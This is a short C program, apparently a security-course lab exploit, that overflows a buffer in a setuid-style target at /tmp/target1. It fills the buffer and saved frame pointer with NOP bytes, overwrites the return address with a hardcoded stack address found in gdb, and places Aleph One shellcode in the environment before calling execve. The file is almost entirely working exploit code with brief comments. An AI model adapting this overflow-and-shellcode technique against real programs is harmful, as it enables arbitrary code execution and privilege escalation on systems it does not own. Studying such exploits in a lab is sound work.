#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
 
  args[0] = TARGET;
  //we fill the 4 spaces of name with x90's(NOP). We then overwrite the ebp with x90's as well. We then step through in gdb
  //and find the desired return memory address 0xbfffff9f -- this is what we add to our args[1] in little endian form
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9f\xff\xff\xbf";
  args[2] = NULL;
 
  //since we can only fit 12 values in our args[1], we place the shellcodeAlephOne in env[0]
  env[0] = shellcodeAlephOne;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}




